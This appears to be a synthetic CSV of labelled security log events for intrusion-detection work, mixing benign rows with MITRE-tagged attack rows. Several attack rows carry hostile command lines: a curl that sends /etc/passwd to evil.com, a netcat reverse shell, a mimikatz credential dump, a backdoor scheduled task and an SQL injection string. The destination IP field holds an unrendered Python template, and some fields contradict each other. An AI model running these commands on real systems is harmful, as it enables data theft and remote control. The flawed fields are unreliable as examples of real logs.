@timestamp,label,attack_name,mitre_technique,mitre_tactic,event.category,event.outcome,source.ip,source.port,destination.ip,destination.port,network.bytes,network.packets,agent.hostname,agent.type,user.name,process.pid,process.name,process.command_line,file_name,domain
2026-09-13T05:08:20.542403,attack,c2_beacon,T1071,command_and_control,network,success,192.168.56.4,38526,"10.0.0.{random.randint(1, 254)}",443,1427,6,backup100,linux,guest,2824,python3,,,evil-c2.com
2026-09-12T23:44:19.568528,benign,,,,network,success,192.168.1.144,3072,10.0.3.209,3306,5116,83,app2,windows,david.moore,9116,systemd,firefox.exe,,
2026-09-15T04:13:09.552919,benign,,,,process,success,192.168.1.185,3072,10.0.4.69,53,5292,77,app4,linux,jane.smith,1402,apache2,firefox.exe,,
2026-09-15T08:58:30.549478,benign,,,,process,success,192.168.1.28,1024,10.0.5.183,53,4369,99,app50,linux,mark.wilson,9241,systemd,firefox.exe,,
2026-09-09T20:02:34.568832,benign,,,,network,success,192.168.1.233,1024,10.0.3.232,53,5996,75,mail1,linux,mark.wilson,2285,firefox.exe,firefox.exe,,
2026-09-09T22:13:08.564815,benign,,,,authentication,success,192.168.1.211,4096,10.0.2.20,22,5043,14,app4,linux,sarah.jones,5856,firefox.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-11T16:58:06.566228,benign,,,,network,success,192.168.1.144,5000,10.0.4.249,22,7672,78,srv1,windows,sarah.jones,6889,firefox.exe,firefox.exe,,
2026-09-11T16:01:36.541483,attack,webshell,T1505,persistence,file,success,192.168.56.2,0,"10.0.0.{random.randint(1, 254)}",0,3676,4,workstation1,windows,guest,723,php,php /var/www/html/shell.php,shell.php,
2026-09-10T18:24:53.553206,benign,,,,process,success,192.168.1.144,3072,10.0.3.114,3306,5020,15,mail5,linux,mike.brown,5013,firefox.exe,firefox.exe,,
2026-09-12T15:50:55.559404,benign,,,,network,success,192.168.1.153,2048,10.0.4.169,53,5113,27,mail2,linux,admin,7066,apache2,chrome.exe --profile-directory=Default,,
2026-09-09T03:16:50.550715,benign,,,,file,success,192.168.1.249,3072,10.0.3.88,53,5986,97,srv50,windows,chris.miller,6539,chrome.exe,explorer.exe,,
2026-09-12T06:50:14.568923,benign,,,,process,success,192.168.1.193,8443,10.0.5.68,443,220,82,web50,windows,lisa.wilson,512,nginx,explorer.exe,,
2026-09-09T15:48:34.544735,attack,persistence,T1053,persistence,process,success,192.168.56.6,0,"10.0.0.{random.randint(1, 254)}",0,628,3,db2,linux,admin,542,schtasks,schtasks /create /tn Backdoor /tr calc.exe /sc onlogon,,
2026-09-11T13:50:01.557759,benign,,,,authentication,success,192.168.1.253,3072,10.0.2.109,3306,6072,68,db2,windows,lisa.wilson,858,systemd,sshd: /usr/sbin/sshd [listener],,
2026-09-11T16:42:45.540320,attack,ssh_brute_force,T1110,credential_access,authentication,failure,192.168.56.2,15572,"10.0.0.{random.randint(1, 254)}",22,446,18,db10,windows,test,4352,python3,,,
2026-09-13T13:29:30.551623,benign,,,,network,success,192.168.1.203,2048,10.0.1.29,443,8705,40,web100,linux,lisa.wilson,4380,chrome.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-10T16:16:17.550811,benign,,,,process,success,192.168.1.69,4096,10.0.2.145,22,5383,61,web1,linux,mike.brown,8520,chrome.exe,explorer.exe,,
2026-09-13T20:01:56.541656,attack,persistence,T1053,persistence,process,success,192.168.56.5,0,"10.0.0.{random.randint(1, 254)}",0,942,2,srv2,windows,administrator,4975,schtasks,schtasks /create /tn Backdoor /tr calc.exe /sc onlogon,,
2026-09-10T20:16:59.568369,benign,,,,authentication,success,192.168.1.39,4096,10.0.4.32,443,3103,38,workstation100,linux,mark.wilson,8779,firefox.exe,apache2 -DFOREGROUND,,
2026-09-14T22:10:22.549143,benign,,,,authentication,success,192.168.1.69,1024,10.0.5.31,3306,3950,81,workstation10,linux,emily.davis,3217,systemd,apache2 -DFOREGROUND,,
2026-09-13T06:53:09.558277,benign,,,,process,success,192.168.1.12,4096,10.0.2.118,53,6429,71,srv10,windows,mike.brown,2646,chrome.exe,chrome.exe --profile-directory=Default,,
2026-09-09T21:44:36.545456,attack,ssh_brute_force,T1110,credential_access,authentication,failure,192.168.56.7,22601,"10.0.0.{random.randint(1, 254)}",22,1258,15,mail1,linux,test,8041,cmd.exe,,,
2026-09-11T17:57:47.567879,benign,,,,authentication,success,192.168.1.162,1024,10.0.3.101,53,4425,73,srv20,linux,sarah.jones,9333,sshd,firefox.exe,,
2026-09-15T16:42:37.555465,benign,,,,network,success,192.168.1.161,5000,10.0.1.52,3306,2186,33,mail4,linux,mark.wilson,1276,sshd,chrome.exe --profile-directory=Default,,
2026-09-13T09:11:52.563586,benign,,,,network,success,192.168.1.207,8443,10.0.2.103,3306,3603,97,workstation50,linux,sarah.jones,3272,explorer.exe,explorer.exe,,
2026-09-11T12:00:58.566095,benign,,,,authentication,success,192.168.1.9,2048,10.0.3.13,3306,8198,82,app2,windows,john.doe,4469,firefox.exe,chrome.exe --profile-directory=Default,,
2026-09-14T21:54:10.557192,benign,,,,file,success,192.168.1.9,3072,10.0.0.16,53,2776,66,web50,windows,sarah.jones,8821,firefox.exe,chrome.exe --profile-directory=Default,,
2026-09-11T15:19:24.543281,attack,sql_injection,T1190,initial_access,web,success,192.168.56.1,34342,"10.0.0.{random.randint(1, 254)}",80,4225,38,srv2,windows,admin,789,python3,SELECT * FROM users WHERE username = 'admin' OR '1'='1',,
2026-09-10T04:29:51.556984,benign,,,,network,success,192.168.1.184,3072,10.0.2.93,3306,9796,96,backup5,windows,emily.davis,4391,explorer.exe,explorer.exe,,
2026-09-09T08:30:12.568309,benign,,,,authentication,success,192.168.1.99,4096,10.0.2.164,80,8756,81,backup20,windows,mike.brown,5756,sshd,explorer.exe,,
2026-09-10T17:24:15.568743,benign,,,,network,success,192.168.1.135,1024,10.0.2.39,80,1670,89,backup5,windows,mike.brown,7876,apache2,apache2 -DFOREGROUND,,
2026-09-11T04:23:26.546646,attack,credential_dump,T1003,credential_access,process,success,192.168.56.6,0,"10.0.0.{random.randint(1, 254)}",0,9812,8,srv20,linux,root,404,mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,,
2026-09-15T05:12:01.543965,attack,c2_beacon,T1071,command_and_control,network,success,192.168.56.3,65502,"10.0.0.{random.randint(1, 254)}",443,377,94,srv50,windows,test,2530,powershell.exe,,,evil-c2.com
2026-09-11T02:55:09.558683,benign,,,,authentication,success,192.168.1.28,2048,10.0.0.60,3306,9385,88,srv5,windows,sarah.jones,3493,apache2,explorer.exe,,
2026-09-12T08:45:28.542252,attack,reverse_shell,T1059,execution,process,success,192.168.56.5,11496,"10.0.0.{random.randint(1, 254)}",4444,1335,44,web5,windows,test,6621,nc,nc -e /bin/bash 192.168.56.10 4444,,
2026-09-10T17:18:29.557512,benign,,,,process,success,192.168.1.35,2048,10.0.2.82,443,1960,54,mail50,windows,mike.brown,1013,sshd,chrome.exe --profile-directory=Default,,
2026-09-14T05:01:44.557216,benign,,,,process,success,192.168.1.153,1024,10.0.2.174,80,9113,36,workstation3,windows,chris.miller,719,nginx,explorer.exe,,
2026-09-13T11:20:17.547774,attack,c2_beacon,T1071,command_and_control,network,success,192.168.56.9,37850,"10.0.0.{random.randint(1, 254)}",443,1350,23,app50,windows,administrator,3552,cmd.exe,,,evil-c2.com
2026-09-10T16:46:38.542906,attack,credential_dump,T1003,credential_access,process,success,192.168.56.7,0,"10.0.0.{random.randint(1, 254)}",0,7301,4,mail10,windows,guest,8021,mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,,
2026-09-15T07:25:37.556719,benign,,,,authentication,success,192.168.1.213,2048,10.0.1.178,3306,3464,64,app20,linux,john.doe,9525,explorer.exe,explorer.exe,,
2026-09-13T02:03:29.560593,benign,,,,network,success,192.168.1.141,3072,10.0.4.208,80,2320,42,db3,windows,chris.miller,6186,nginx,apache2 -DFOREGROUND,,
2026-09-13T08:10:59.562687,benign,,,,process,success,192.168.1.121,8443,10.0.2.141,443,3034,6,workstation4,linux,sarah.jones,3253,explorer.exe,explorer.exe,,
2026-09-13T04:54:03.548003,attack,sql_injection,T1190,initial_access,web,success,192.168.56.2,56245,"10.0.0.{random.randint(1, 254)}",80,2618,35,backup4,windows,test,890,powershell.exe,SELECT * FROM users WHERE username = 'admin' OR '1'='1',,
2026-09-10T09:57:43.562301,benign,,,,process,success,192.168.1.238,5000,10.0.2.68,443,1547,56,app2,windows,chris.miller,2592,systemd,sshd: /usr/sbin/sshd [listener],,
2026-09-11T07:04:56.568230,benign,,,,process,success,192.168.1.245,5000,10.0.5.81,53,8494,57,db10,windows,john.doe,8953,systemd,chrome.exe --profile-directory=Default,,
2026-09-13T04:59:06.560871,benign,,,,network,success,192.168.1.7,2048,10.0.2.22,3306,8511,57,workstation50,windows,john.doe,6048,firefox.exe,apache2 -DFOREGROUND,,
2026-09-09T19:44:26.547254,attack,ssh_brute_force,T1110,credential_access,authentication,failure,192.168.56.10,60910,"10.0.0.{random.randint(1, 254)}",22,176,3,srv50,linux,test,799,powershell.exe,,,
2026-09-14T22:39:57.561741,benign,,,,network,success,192.168.1.53,4096,10.0.0.57,22,7676,7,workstation50,windows,mark.wilson,2333,explorer.exe,firefox.exe,,
2026-09-13T15:58:18.547222,attack,ssh_brute_force,T1110,credential_access,authentication,failure,192.168.56.7,55532,"10.0.0.{random.randint(1, 254)}",22,1986,14,db4,windows,test,5000,cmd.exe,,,
2026-09-10T20:17:14.570261,benign,,,,network,success,192.168.1.174,5000,10.0.0.240,22,5107,53,app5,windows,mike.brown,7781,explorer.exe,explorer.exe,,
2026-09-10T11:30:44.567075,benign,,,,file,success,192.168.1.240,2048,10.0.4.225,22,1819,86,web100,linux,emily.davis,975,chrome.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-12T16:28:35.560312,benign,,,,network,success,192.168.1.99,1024,10.0.3.15,80,6262,87,mail3,windows,lisa.wilson,8326,systemd,apache2 -DFOREGROUND,,
2026-09-14T19:52:19.558137,benign,,,,process,success,192.168.1.250,3072,10.0.5.34,22,1231,59,mail10,windows,david.moore,703,explorer.exe,chrome.exe --profile-directory=Default,,
2026-09-10T10:43:44.566337,benign,,,,authentication,success,192.168.1.197,8443,10.0.0.126,80,6163,43,db10,windows,john.doe,3014,explorer.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-15T08:04:15.550900,benign,,,,network,success,192.168.1.193,5000,10.0.1.82,443,3375,36,web2,windows,chris.miller,2646,systemd,apache2 -DFOREGROUND,,
2026-09-10T10:56:17.570640,benign,,,,network,success,192.168.1.238,3072,10.0.0.19,80,2923,11,app50,linux,admin,2578,explorer.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-10T18:56:13.552624,benign,,,,authentication,success,192.168.1.252,4096,10.0.1.155,53,5194,6,db4,linux,john.doe,1800,apache2,explorer.exe,,
2026-09-12T15:13:40.541001,attack,ssh_brute_force,T1110,credential_access,authentication,failure,192.168.56.10,61940,"10.0.0.{random.randint(1, 254)}",22,995,8,srv1,windows,root,4138,cmd.exe,,,
2026-09-10T19:20:11.545478,attack,data_exfiltration,T1048,exfiltration,network,success,192.168.56.8,4816,"10.0.0.{random.randint(1, 254)}",53,43486,453,srv10,linux,root,1351,python3,curl -d @/etc/passwd http://evil.com/exfil,,
2026-09-12T23:46:05.544914,attack,credential_dump,T1003,credential_access,process,success,192.168.56.8,0,"10.0.0.{random.randint(1, 254)}",0,4500,4,workstation20,windows,administrator,3688,mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,,
2026-09-10T01:24:02.568573,benign,,,,process,success,192.168.1.193,8443,10.0.5.69,443,9345,38,web3,linux,sarah.jones,4210,systemd,explorer.exe,,
2026-09-10T06:17:21.548822,benign,,,,process,success,192.168.1.114,5000,10.0.3.115,80,1142,24,web4,linux,mike.brown,6471,firefox.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-10T14:52:46.547009,attack,lateral_movement,T1021,lateral_movement,network,success,192.168.56.2,60100,"10.0.0.{random.randint(1, 254)}",445,40441,399,db4,windows,test,9345,psexec.exe,,,
2026-09-12T10:10:31.543093,attack,credential_dump,T1003,credential_access,process,success,192.168.56.3,0,"10.0.0.{random.randint(1, 254)}",0,7909,5,app50,linux,root,6761,mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,,
2026-09-09T21:36:57.566995,benign,,,,file,success,192.168.1.232,1024,10.0.5.241,22,6299,72,srv20,linux,chris.miller,6870,explorer.exe,explorer.exe,,
2026-09-14T04:08:26.551941,benign,,,,network,success,192.168.1.16,3072,10.0.1.153,443,4295,46,mail50,linux,sarah.jones,3821,sshd,sshd: /usr/sbin/sshd [listener],,
2026-09-13T14:56:54.559006,benign,,,,authentication,success,192.168.1.199,4096,10.0.3.89,22,1901,84,app3,linux,chris.miller,3717,nginx,sshd: /usr/sbin/sshd [listener],,
2026-09-14T15:21:55.551712,benign,,,,authentication,success,192.168.1.102,2048,10.0.1.36,443,5451,56,srv50,linux,john.doe,5206,sshd,apache2 -DFOREGROUND,,
2026-09-15T14:09:14.547940,attack,sql_injection,T1190,initial_access,web,success,192.168.56.3,62179,"10.0.0.{random.randint(1, 254)}",80,2282,33,db10,windows,guest,2313,cmd.exe,SELECT * FROM users WHERE username = 'admin' OR '1'='1',,
2026-09-10T15:27:48.545296,attack,reverse_shell,T1059,execution,process,success,192.168.56.9,30028,"10.0.0.{random.randint(1, 254)}",4444,2547,15,web1,windows,admin,9386,nc,nc -e /bin/bash 192.168.56.10 4444,,
2026-09-12T01:46:18.542822,attack,sql_injection,T1190,initial_access,web,success,192.168.56.1,28316,"10.0.0.{random.randint(1, 254)}",80,810,50,mail5,linux,guest,9136,cmd.exe,SELECT * FROM users WHERE username = 'admin' OR '1'='1',,
2026-09-12T16:17:12.570702,benign,,,,process,success,192.168.1.190,1024,10.0.2.207,3306,5458,31,app20,windows,sarah.jones,3147,nginx,apache2 -DFOREGROUND,,
2026-09-15T10:04:44.563161,benign,,,,network,success,192.168.1.211,3072,10.0.0.31,3306,2008,42,workstation5,windows,mike.brown,6375,apache2,apache2 -DFOREGROUND,,
2026-09-12T17:08:25.569034,benign,,,,network,success,192.168.1.36,8443,10.0.2.150,443,8882,39,db50,linux,admin,9183,explorer.exe,chrome.exe --profile-directory=Default,,
2026-09-09T00:04:10.566893,benign,,,,file,success,192.168.1.155,4096,10.0.2.181,3306,141,56,mail3,linux,john.doe,3596,sshd,apache2 -DFOREGROUND,,
2026-09-15T16:30:32.561806,benign,,,,network,success,192.168.1.124,8443,10.0.3.218,53,8918,42,srv10,linux,david.moore,2188,chrome.exe,chrome.exe --profile-directory=Default,,
2026-09-08T17:20:55.566082,benign,,,,process,success,192.168.1.43,1024,10.0.0.42,443,3802,98,web4,linux,emily.davis,8331,firefox.exe,firefox.exe,,
2026-09-13T19:56:25.562420,benign,,,,authentication,success,192.168.1.234,2048,10.0.0.200,80,6063,18,workstation100,windows,john.doe,7584,firefox.exe,apache2 -DFOREGROUND,,
2026-09-11T09:01:29.544205,attack,credential_dump,T1003,credential_access,process,success,192.168.56.3,0,"10.0.0.{random.randint(1, 254)}",0,2312,9,web5,linux,root,8339,mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,,
2026-09-14T16:49:06.566401,benign,,,,network,success,192.168.1.237,1024,10.0.3.129,22,1146,18,backup1,linux,david.moore,1436,chrome.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-11T16:51:46.553337,benign,,,,network,success,192.168.1.141,2048,10.0.2.71,53,8245,75,app10,windows,emily.davis,2440,sshd,sshd: /usr/sbin/sshd [listener],,
2026-09-12T00:13:49.558078,benign,,,,network,success,192.168.1.105,1024,10.0.5.5,443,1362,60,srv100,windows,jane.smith,482,sshd,sshd: /usr/sbin/sshd [listener],,
2026-09-10T19:13:24.550626,benign,,,,network,success,192.168.1.111,4096,10.0.0.118,22,6288,85,workstation10,linux,admin,9063,chrome.exe,explorer.exe,,
2026-09-10T23:51:48.561585,benign,,,,process,success,192.168.1.240,1024,10.0.0.59,3306,6870,89,backup100,windows,chris.miller,7039,explorer.exe,apache2 -DFOREGROUND,,
2026-09-09T11:20:20.559438,benign,,,,network,success,192.168.1.13,8443,10.0.3.57,3306,5883,53,db4,linux,david.moore,9929,sshd,sshd: /usr/sbin/sshd [listener],,
2026-09-15T05:27:42.550735,benign,,,,process,success,192.168.1.93,1024,10.0.3.41,443,7343,86,workstation4,linux,chris.miller,8933,nginx,sshd: /usr/sbin/sshd [listener],,
2026-09-13T16:26:55.546698,attack,sql_injection,T1190,initial_access,web,success,192.168.56.9,29360,"10.0.0.{random.randint(1, 254)}",80,3700,49,srv100,linux,test,8577,python3,SELECT * FROM users WHERE username = 'admin' OR '1'='1',,
2026-09-09T20:04:26.547619,attack,port_scan,T1046,discovery,network,success,192.168.56.8,35053,"10.0.0.{random.randint(1, 254)}",443,4632,34,app20,linux,test,2991,bash,,,
2026-09-13T04:14:30.567159,benign,,,,network,success,192.168.1.2,8443,10.0.2.108,3306,1935,14,srv2,windows,chris.miller,1984,nginx,firefox.exe,,
2026-09-13T06:50:57.543124,attack,webshell,T1505,persistence,file,success,192.168.56.9,0,"10.0.0.{random.randint(1, 254)}",0,1993,6,web1,linux,guest,9414,php,php /var/www/html/shell.php,shell.php,
2026-09-12T11:53:28.549779,benign,,,,network,success,192.168.1.137,4096,10.0.1.110,80,4792,58,mail50,linux,mark.wilson,3006,systemd,chrome.exe --profile-directory=Default,,
2026-09-09T18:45:48.543064,attack,lateral_movement,T1021,lateral_movement,network,success,192.168.56.7,24883,"10.0.0.{random.randint(1, 254)}",445,12451,91,workstation2,windows,guest,4163,psexec.exe,,,
2026-09-11T02:49:42.568534,benign,,,,network,success,192.168.1.170,4096,10.0.1.84,53,1878,70,db50,windows,jane.smith,3976,firefox.exe,explorer.exe,,
2026-09-10T18:18:50.550926,benign,,,,authentication,success,192.168.1.231,8443,10.0.1.198,443,5358,83,srv100,linux,jane.smith,9325,firefox.exe,chrome.exe --profile-directory=Default,,
2026-09-11T03:22:24.547960,attack,port_scan,T1046,discovery,network,success,192.168.56.7,48614,"10.0.0.{random.randint(1, 254)}",8080,1197,27,srv1,linux,test,5459,bash,,,
2026-09-15T11:18:23.563236,benign,,,,file,success,192.168.1.229,2048,10.0.0.13,443,7973,8,srv5,windows,sarah.jones,4084,chrome.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-14T19:53:30.554723,benign,,,,network,success,192.168.1.215,4096,10.0.5.71,3306,9218,60,app20,windows,emily.davis,3268,chrome.exe,chrome.exe --profile-directory=Default,,
2026-09-11T22:42:47.560025,benign,,,,network,success,192.168.1.20,1024,10.0.0.253,3306,2693,77,backup5,linux,lisa.wilson,1928,chrome.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-15T12:51:01.548878,benign,,,,process,success,192.168.1.163,1024,10.0.2.15,443,9892,72,backup4,linux,mark.wilson,932,firefox.exe,explorer.exe,,
2026-09-09T19:49:02.547024,attack,lateral_movement,T1021,lateral_movement,network,success,192.168.56.5,40351,"10.0.0.{random.randint(1, 254)}",445,49619,78,workstation20,linux,administrator,3611,psexec.exe,,,
2026-09-12T23:05:23.556589,benign,,,,network,success,192.168.1.238,5000,10.0.1.192,443,9104,44,web2,linux,sarah.jones,5023,systemd,sshd: /usr/sbin/sshd [listener],,
2026-09-13T15:30:34.558499,benign,,,,authentication,success,192.168.1.171,2048,10.0.3.131,80,2591,41,db3,windows,mark.wilson,7991,systemd,firefox.exe,,
2026-09-13T12:20:46.546889,attack,c2_beacon,T1071,command_and_control,network,success,192.168.56.2,19628,"10.0.0.{random.randint(1, 254)}",443,7238,90,mail1,windows,root,1250,python3,,,evil-c2.com
2026-09-09T15:43:55.548891,benign,,,,process,success,192.168.1.204,1024,10.0.3.124,53,509,88,web20,linux,admin,1804,explorer.exe,firefox.exe,,
2026-09-11T03:31:51.560413,benign,,,,file,success,192.168.1.55,5000,10.0.4.7,443,5560,45,db4,linux,mark.wilson,6329,explorer.exe,explorer.exe,,
2026-09-12T18:00:59.560556,benign,,,,network,success,192.168.1.228,5000,10.0.5.72,53,5347,92,db1,linux,mike.brown,403,firefox.exe,chrome.exe --profile-directory=Default,,
2026-09-09T23:36:52.555676,benign,,,,authentication,success,192.168.1.125,3072,10.0.3.132,80,5819,64,mail1,windows,david.moore,7385,firefox.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-09T06:31:48.545613,attack,ssh_brute_force,T1110,credential_access,authentication,failure,192.168.56.8,45123,"10.0.0.{random.randint(1, 254)}",22,1423,10,workstation5,windows,administrator,7555,powershell.exe,,,
2026-09-14T12:57:42.567271,benign,,,,network,success,192.168.1.168,8443,10.0.2.141,53,1757,49,backup20,windows,jane.smith,9798,apache2,sshd: /usr/sbin/sshd [listener],,
2026-09-13T22:21:42.544309,attack,reverse_shell,T1059,execution,process,success,192.168.56.1,21199,"10.0.0.{random.randint(1, 254)}",4444,3251,14,backup10,windows,test,2871,nc,nc -e /bin/bash 192.168.56.10 4444,,
2026-09-09T09:44:56.546703,attack,persistence,T1053,persistence,process,success,192.168.56.3,0,"10.0.0.{random.randint(1, 254)}",0,702,8,mail50,windows,administrator,7228,schtasks,schtasks /create /tn Backdoor /tr calc.exe /sc onlogon,,
2026-09-12T06:47:49.560372,benign,,,,process,success,192.168.1.97,1024,10.0.1.143,53,1119,59,app5,windows,lisa.wilson,9960,chrome.exe,firefox.exe,,
2026-09-10T12:21:54.558434,benign,,,,network,success,192.168.1.27,2048,10.0.5.31,22,2205,36,mail20,windows,lisa.wilson,6468,chrome.exe,chrome.exe --profile-directory=Default,,
2026-09-10T18:21:36.552947,benign,,,,file,success,192.168.1.143,3072,10.0.3.60,22,1791,15,backup5,linux,david.moore,5463,firefox.exe,firefox.exe,,
2026-09-09T10:34:59.546195,attack,webshell,T1505,persistence,file,success,192.168.56.10,0,"10.0.0.{random.randint(1, 254)}",0,4940,2,mail100,linux,admin,5030,php,php /var/www/html/shell.php,shell.php,
2026-09-14T12:28:13.556189,benign,,,,network,success,192.168.1.223,4096,10.0.4.67,443,4040,75,web50,linux,mark.wilson,3149,sshd,sshd: /usr/sbin/sshd [listener],,
2026-09-11T15:48:13.546760,attack,ssh_brute_force,T1110,credential_access,authentication,failure,192.168.56.9,54342,"10.0.0.{random.randint(1, 254)}",22,716,3,backup1,windows,guest,2048,powershell.exe,,,
2026-09-11T13:28:09.559942,benign,,,,authentication,success,192.168.1.26,1024,10.0.2.248,443,2438,47,srv50,windows,chris.miller,6331,chrome.exe,explorer.exe,,
2026-09-09T12:23:14.562680,benign,,,,authentication,success,192.168.1.221,2048,10.0.4.165,3306,9408,20,app1,linux,mike.brown,1440,chrome.exe,chrome.exe --profile-directory=Default,,
2026-09-13T23:08:46.558169,benign,,,,process,success,192.168.1.45,3072,10.0.3.168,443,6648,15,mail20,windows,john.doe,1949,explorer.exe,firefox.exe,,
2026-09-15T00:20:13.568260,benign,,,,authentication,success,192.168.1.169,2048,10.0.0.138,22,3133,71,srv3,linux,sarah.jones,7985,chrome.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-09T21:16:57.559427,benign,,,,network,success,192.168.1.103,5000,10.0.3.140,53,2848,57,backup50,linux,mark.wilson,8651,systemd,apache2 -DFOREGROUND,,
2026-09-10T04:20:17.541054,attack,port_scan,T1046,discovery,network,success,192.168.56.2,30210,"10.0.0.{random.randint(1, 254)}",445,1853,33,backup4,windows,admin,2357,cmd.exe,,,
2026-09-15T00:35:10.562240,benign,,,,file,success,192.168.1.129,2048,10.0.2.81,443,4991,50,backup20,linux,jane.smith,9910,apache2,chrome.exe --profile-directory=Default,,
2026-09-09T10:47:52.557211,benign,,,,authentication,success,192.168.1.218,8443,10.0.5.65,22,5260,83,srv10,linux,jane.smith,3520,apache2,chrome.exe --profile-directory=Default,,
2026-09-13T04:27:11.544227,attack,ssh_brute_force,T1110,credential_access,authentication,failure,192.168.56.3,57808,"10.0.0.{random.randint(1, 254)}",22,1660,8,backup3,linux,guest,1301,python3,,,
2026-09-11T13:21:01.550683,benign,,,,file,success,192.168.1.35,5000,10.0.1.105,22,5626,11,backup100,linux,lisa.wilson,6353,apache2,firefox.exe,,
2026-09-12T06:09:22.555427,benign,,,,network,success,192.168.1.242,2048,10.0.3.186,3306,298,69,db4,windows,admin,6183,firefox.exe,apache2 -DFOREGROUND,,
2026-09-15T17:15:35.567456,benign,,,,authentication,success,192.168.1.134,4096,10.0.0.217,80,9898,29,srv50,linux,lisa.wilson,6968,firefox.exe,firefox.exe,,
2026-09-09T18:42:08.566312,benign,,,,file,success,192.168.1.29,3072,10.0.4.168,53,8587,32,workstation20,windows,chris.miller,7399,sshd,firefox.exe,,
2026-09-12T03:13:18.542462,attack,ssh_brute_force,T1110,credential_access,authentication,failure,192.168.56.10,60222,"10.0.0.{random.randint(1, 254)}",22,1733,13,backup2,windows,guest,1345,python3,,,
2026-09-14T05:03:31.570440,benign,,,,network,success,192.168.1.60,5000,10.0.3.98,443,7814,95,web5,linux,mike.brown,7087,systemd,explorer.exe,,
2026-09-11T23:49:40.568266,benign,,,,process,success,192.168.1.207,2048,10.0.0.226,80,7871,42,app20,windows,sarah.jones,9679,sshd,chrome.exe --profile-directory=Default,,
2026-09-10T11:29:00.547836,attack,reverse_shell,T1059,execution,process,success,192.168.56.8,60241,"10.0.0.{random.randint(1, 254)}",4444,329,24,srv100,linux,admin,2092,nc,nc -e /bin/bash 192.168.56.10 4444,,
2026-09-11T02:29:13.568667,benign,,,,file,success,192.168.1.160,3072,10.0.4.82,53,2433,15,app100,windows,john.doe,7958,apache2,firefox.exe,,
2026-09-11T14:47:30.543583,attack,c2_beacon,T1071,command_and_control,network,success,192.168.56.8,43154,"10.0.0.{random.randint(1, 254)}",443,4281,58,db5,linux,root,9413,python3,,,evil-c2.com
2026-09-13T09:41:02.564981,benign,,,,process,success,192.168.1.208,3072,10.0.4.177,53,8542,42,web2,windows,mike.brown,8256,firefox.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-14T10:59:43.558019,benign,,,,network,success,192.168.1.242,4096,10.0.1.194,53,7235,45,backup10,linux,sarah.jones,2484,explorer.exe,explorer.exe,,
2026-09-12T06:49:07.554350,benign,,,,network,success,192.168.1.43,1024,10.0.2.229,22,8160,62,srv2,windows,mike.brown,1692,chrome.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-15T13:33:26.563528,benign,,,,process,success,192.168.1.87,2048,10.0.3.154,80,1374,68,srv3,windows,mike.brown,7182,chrome.exe,explorer.exe,,
2026-09-12T02:13:22.561288,benign,,,,network,success,192.168.1.21,8443,10.0.2.93,3306,5190,72,db50,linux,mark.wilson,9214,explorer.exe,apache2 -DFOREGROUND,,
2026-09-15T07:29:01.564150,benign,,,,process,success,192.168.1.148,3072,10.0.2.27,3306,8293,8,db100,linux,sarah.jones,9680,chrome.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-13T18:15:55.566071,benign,,,,network,success,192.168.1.239,3072,10.0.4.142,80,167,5,workstation5,linux,david.moore,9984,explorer.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-12T10:06:13.568868,benign,,,,authentication,success,192.168.1.154,1024,10.0.2.230,80,9391,74,mail20,windows,emily.davis,9213,explorer.exe,explorer.exe,,
2026-09-11T06:32:10.552862,benign,,,,process,success,192.168.1.179,4096,10.0.3.104,80,2194,57,web20,linux,mike.brown,4445,systemd,apache2 -DFOREGROUND,,
2026-09-09T10:55:40.549077,benign,,,,network,success,192.168.1.48,3072,10.0.4.139,3306,8401,50,web3,linux,sarah.jones,5222,systemd,explorer.exe,,
